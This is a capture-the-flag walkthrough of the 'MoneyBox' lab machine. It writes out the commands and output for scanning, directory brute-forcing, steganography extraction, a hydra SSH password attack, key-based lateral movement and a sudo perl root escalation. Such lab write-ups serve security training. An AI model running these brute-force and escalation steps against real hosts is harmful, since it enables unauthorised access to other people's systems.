// I started by enumerating the machine
```
┌──(root㉿kali)-[/home/astra]
└─# nmap -p- --min-rate 10000 -Pn -sV 192.168.197.230

Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 10:52 EST
Nmap scan report for 192.168.197.230
Host is up (0.14s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.96 seconds
```
// Nothing to see... So I go to the webpage, checked for hidden stuff on the source code, but nothing.

```
<html>
<head><title>MoneyBox</title></head>
<body>
    <h1><big>Hai Everyone......!</big></h1>
    <h2>Welcome To MoneyBox CTF</h2>
    <p><pre>
  __  __                        ____            
 |  \/  |                      |  _ \           
 | \  / | ___  _ __   ___ _   _| |_) | _____  __
 | |\/| |/ _ \| '_ \ / _ \ | | |  _ < / _ \ \/ /
 | |  | | (_) | | | |  __/ |_| | |_) | (_) >  < 
 |_|  |_|\___/|_| |_|\___|\__, |____/ \___/_/\_\
                           __/ |                
                          |___/                 </p><br>
    <p><b>it's a very simple Box.so don't overthink</b></p>
</body>
</html>
```

// So I started scanning for hidden directories or files

```
┌──(root㉿kali)-[/home/astra]
└─# gobuster dir -u http://192.168.197.230/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 150

===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.197.230/
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/21 10:55:51 Starting gobuster in directory enumeration mode
===============================================================
/blogs                (Status: 301) [Size: 318] [--> http://192.168.197.230/blogs/]
/server-status        (Status: 403) [Size: 280]
Progress: 220560 / 220561 (100.00%)
===============================================================
2023/02/21 10:59:20 Finished
===============================================================
```

// I found this directory called "blogs" I got to it and I found something interesting in the source code
```
<html>
<head><title>MoneyBox</title></head>
<body>
    <h1>I'm T0m-H4ck3r</h1><br>
        <p>I Already Hacked This Box and Informed.But They didn't Do any Security configuration</p>
        <p>If You Want Hint For Next Step......?<p>
</body>
</html>
```


<!--the hint is the another secret directory is S3cr3t-T3xt-->

// So, I go to http://192.168.197.230/S3cr3t-T3xt/ and found this on the source code
```
<html>
<head><title>MoneyBox</title></head>
<body>
    <h1>There is Nothing In this Page.........</h1>
</body>
</html>

<!..Secret Key 3xtr4ctd4t4 >
```
// I thought this maybe an password "extractdata" so I tried to connect to ftp, for my surprise it had an image that I had missed on, I download it and I run steghide command to see if it has anything, using the password "extractdata"
```
┌──(root㉿kali)-[/home/astra]
└─# ftp 192.168.197.230

Connected to 192.168.197.230.
220 (vsFTPd 3.0.3)
Name (192.168.197.230:astra): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||56601|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0         1093656 Feb 26  2021 trytofind.jpg
226 Directory send OK.
```
// Here I run the command "get" to download the image on my machine on the current directory
ftp> get trytofind.jpg 
```
local: trytofind.jpg remote: trytofind.jpg
229 Entering Extended Passive Mode (|||48069|)
150 Opening BINARY mode data connection for trytofind.jpg (1093656 bytes).
100% |***********************************************************************************************************|  1068 KiB  237.53 KiB/s    00:00 ETA
226 Transfer complete.
1093656 bytes received in 00:04 (230.84 KiB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                       
┌──(root㉿kali)-[/home/astra]
└─# steghide --extract -sf trytofind.jpg
Enter passphrase: 
wrote extracted data to "data.txt".
                                                                                                                                                        
┌──(root㉿kali)-[/home/astra]
└─# cat data.txt   
Hello.....  renu

      I tell you something Important.Your Password is too Week So Change Your Password
Don't Underestimate it.......
```
// Now I got a user called "renu" and the file tells me the password is too week, so I will use hydra to try and crack the ssh password
```
┌──(root㉿kali)-[/home/astra]
└─# hydra -l renu -P rockyou.txt -f 192.168.197.230 ssh -I

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-02-21 11:11:27
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.197.230:22/
[22][ssh] host: 192.168.197.230   login: renu   password: 987654321
[STATUS] attack finished for 192.168.197.230 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-02-21 11:12:24
```                                                                                           
// Found the password "987654321" now I will connect to the ssh and get the first flag
```
┌──(root㉿kali)-[/home/astra]
└─# ssh -l renu 192.168.197.230         

renu@192.168.197.230's password: 
Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Sep 23 10:00:13 2022
renu@MoneyBox:~$ ls
ftp  local.txt
renu@MoneyBox:~$ cat local.txt 
ee278fead71bfc63679ae9a112139df0
renu@MoneyBox:~$ 
```
// Now we got the first flag ! I go to /home/ and find an user called "lily" and I also got the authorized_key from renu, meaning he can connect to ssh without password
```
renu@MoneyBox:/home$ ls

lily  renu
renu@MoneyBox:/home$ cd lily
renu@MoneyBox:/home/lily$ ls
renu@MoneyBox:/home/lily$ ls -la
total 32
drwxr-xr-x 4 lily lily 4096 Oct 11 10:52 .
drwxr-xr-x 4 root root 4096 Feb 26  2021 ..
-rw------- 1 lily lily  985 Feb 26  2021 .bash_history
-rw-r--r-- 1 lily lily  220 Feb 25  2021 .bash_logout
-rw-r--r-- 1 lily lily 3526 Feb 25  2021 .bashrc
drwxr-xr-x 3 lily lily 4096 Feb 25  2021 .local
-rw-r--r-- 1 lily lily  807 Feb 25  2021 .profile
drwxr-xr-x 2 lily lily 4096 Feb 26  2021 .ssh

renu@MoneyBox:/home/lily$ cd .ssh
renu@MoneyBox:/home/lily/.ssh$ cat authorized_keys 

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 renu@debian
renu@MoneyBox:/home/lily/.ssh$ 
```
// Now I use ssh lily@192.168.197.230, and got into lily user 
```
renu@MoneyBox:~$ ssh lily@192.168.197.230

The authenticity of host '192.168.197.230 (192.168.197.230)' can't be established.
ECDSA key fingerprint is SHA256:8GzSoXjLv35yJ7cQf1EE0rFBb9kLK/K1hAjzK/IXk8I.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.197.230' (ECDSA) to the list of known hosts.
Linux MoneyBox 4.19.0-22-amd64 #1 SMP Debian 4.19.260-1 (2022-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb 26 09:07:47 2021 from 192.168.43.80

lily@MoneyBox:~$ 
```
// I do an sudo -l and I can see that lily can run perl commands as root without asking for password, so I do an simple perl command and got root access. 
```
lily@MoneyBox:/$ sudo perl -e 'exec "/bin/bash";'
root@MoneyBox:/# cd root
root@MoneyBox:~# ls
proof.txt
root@MoneyBox:~# cat proof.txt 
bf3e7ad76f3dfd2cd63774da95695246
root@MoneyBox:~# gg
```



